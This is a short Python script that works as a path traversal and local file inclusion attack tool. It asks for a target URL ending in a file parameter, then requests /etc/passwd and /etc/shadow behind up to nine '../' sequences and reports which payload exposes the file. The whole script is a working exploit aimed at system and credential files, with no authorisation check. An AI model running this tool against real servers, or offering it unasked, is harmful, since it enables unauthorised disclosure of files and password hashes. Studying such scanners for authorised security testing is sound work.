#!/usr/bin/env python
import requests

print('\033[91m Warning:Your target address should be like http://example.com/index.php?file= \033[0m')
url = input('Enter your url: ')
payloads = {'/etc/passwd': 'root:x', '/etc/shadow': 'root:'}
# /etc/passwd file will contain a text like below:
# """root:x:0:0:root:/root:/usr/bin/zsh
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# ..."""

dir = '../'
n = 0

for payload, key in payloads.items():
    for n in range(10):
        # If attack was not successful by using a payload like "../etc/passwd", So we should go deeper like this "../../../../../etc/passwd"
        req = requests.get(url + (n * dir) + payload)
        if key in req.text:
            print('This parameter is vulnerable and attack payload is \033[91m{}'.format((n * dir) + payload) + '\033[0m')
            break
        else:
            pass
